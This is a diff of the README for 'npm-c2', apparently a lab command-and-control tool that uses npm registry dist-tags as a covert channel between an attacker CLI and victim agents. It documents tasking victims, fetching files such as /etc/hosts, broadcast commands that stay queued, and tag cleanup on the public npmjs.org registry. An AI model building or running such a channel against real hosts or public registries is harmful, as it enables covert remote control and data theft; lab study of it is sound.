@@ -73,19 +73,19 @@ password when `LAB_PASS` is not supplied.
 In the CLI:
 
 ```
-npm-c2> task all ping              # fan out to every currently online agent
+npm-c2> task all ping              # one broadcast tag for all polling agents
 npm-c2> task all whoami            # report mock identity details
 npm-c2> task all pwd               # where is the agent?
 npm-c2> task all ls /tmp           # list a directory on the victim
 npm-c2> task all getfile /etc/hosts  # fetch a file (absolute or cwd-relative)
-npm-c2> agents                     # list agents (joins also print live)
+npm-c2> agents                     # list historically discovered agents
 npm-c2> history 10                 # last 10 requests/responses
 npm-c2> stats                      # local counters
 npm-c2> clean                      # delete all x-cmd-*/x-res-*/x-ann-* tags
 npm-c2> exit
 ```
 
-The CLI polls in the background while you type: agent joins and task
+The CLI polls in the background while you type: agent discoveries and task
 completions/failures print as live notifications — no `watch` needed.
 
 Tear down:
@@ -161,16 +161,17 @@ group- or world-readable env files are refused.
 | — / `NPM_C2_CONFIG` | explicit config file path | `./config.json` |
 | — / `NPM_C2_LOG_LEVEL` | `debug`/`info`/`warn`/`error` | `info` |
 
-State files: `victim-state.json` (agent id + last processed seq per target),
-`attacker-state.json` (next seq per target, seen results, agent info, request/
+State files: `victim-state.json` (agent id, command-baseline version, and last
+processed seq per target), `attacker-state.json` (last issued seq per target,
+with new sequences allocated globally, seen results, discovered agent ids, request/
 response history, stats). Delete them to reset a side.
 
 ## Attacker CLI reference
 
 | Command | Description |
 |---|---|
-| `agents` | list agents with online/offline/unknown presence, last observed heartbeat, host, and cwd |
-| `task <agentId\|all> <op> [args...]` | task one online agent or fan out to all online agents |
+| `agents` | list historically discovered agents and result counts; no liveness claim |
+| `task <agentId\|all> <op> [args...]` | task one known agent or publish one broadcast for all agents |
 | `history [n]` | show the last n requests/responses (default 20, persisted) |
 | `poll` | fetch new results; show locally pending direct tasks while waiting |
 | `clean` | delete all `x-cmd-*`/`x-res-*`/`x-ann-*` tags (leaves only `latest`) |
@@ -195,28 +196,29 @@ desktop utilities. Minimal/headless Linux systems report a clear error when
 the required browser, speech, notification, or audio utility is unavailable.
 
 While the prompt is idle, the CLI polls in the background (every
-`min(pollIntervalSec, 5)`s) and prints live notifications when an agent
-joins and when a task completes or fails. Victims refresh an `x-ann-*`
-heartbeat every `max(30 seconds, pollIntervalSec)`. Three missed heartbeat
-windows mark an agent offline. Presence uses the attacker's local observation
-time, so clock skew on a victim cannot keep it online or mark it offline early.
-An agent is `unknown` while the first heartbeat change is pending, after a
-registry refresh failure, or after `clean`; direct tasks require `online`.
-Heartbeat publication runs independently of result uploads so large transfers
-do not suppress presence updates.
-Direct commands carry a recent heartbeat lease and are rejected after that
-lease rolls out of the agent's four-heartbeat window, without comparing clocks
-between machines. The attacker also removes command tags after four windows.
+`min(pollIntervalSec, 5)`s) and prints live notifications when an agent is
+first discovered and when a task completes or fails. Each victim publishes
+the deterministic announcement payload `{ "v": 1 }`; the same agent id always
+produces the same `x-ann-*` tag, including across restarts. The tag is a
+historical discovery marker, not a heartbeat: `known` does not mean online,
+and host, cwd, leases, and online/offline status are intentionally absent.
 
-To disconnect a victim, press Ctrl-C once: the agent deletes its own announce
-tag, saves state, and exits (a second Ctrl-C force-exits and skips the
-deletion, e.g. when the registry is unreachable). The attacker does not flip
-the agent to `offline` immediately — presence is timeout-based on the
-attacker's local clock, so a stopped agent (graceful or killed) goes `offline`
-after three missed heartbeat windows (~90 s at the default 30 s heartbeat,
-plus up to one poll interval). Registry read caching means a deleted tag is
-not guaranteed visible to the attacker's very next poll, which is why tag
-disappearance is not treated as an instant offline signal.
+Direct tasks require a previously discovered agent id. `task all` writes one
+`x-cmd-all-*` broadcast tag instead of per-agent fan-out. On the first
+successful poll after installing or upgrading this version, a victim records
+the highest existing direct and broadcast sequences and does not execute those
+pre-existing commands. Commands published later may remain queued and execute
+after a reconnect; there is no lease- or clock-based expiry.
+
+To disconnect a victim, press Ctrl-C once: the agent saves state and exits (a
+second Ctrl-C force-exits). Its stable announcement remains so restarts do not
+create additional discovery tags.
+
+On npmjs.org, sensitive package-management DELETE operations require
+interactive 2FA and cannot be automated with a bypass-2FA granular token.
+Consequently `clean` is automatic on the local Verdaccio lab but may fail on
+npmjs.org; use interactive `npm dist-tag rm ...` for manual cleanup. Command
+and result tags otherwise remain and accumulate with task activity.
 
 `getfile` transfers bytes, so small images and short video samples work the
 same way as text files. The attacker saves reassembled downloads under
